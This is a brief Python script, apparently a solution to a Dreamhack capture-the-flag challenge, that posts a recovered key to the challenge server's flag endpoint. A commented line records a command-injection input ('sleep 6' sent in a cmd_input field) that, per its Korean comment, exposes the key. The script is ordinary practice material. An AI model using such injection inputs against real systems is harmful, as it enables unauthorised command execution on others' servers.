import requests
###payload={"cmd_input" : "sleep 6"} 하면 키가 나옴
url = "http://host3.dreamhack.games:8614/flag"


payload = {"key": "409ac0d96943d3da52f176ae9ff2b974"}

res = requests.post(url, data=payload)
print(res.text)
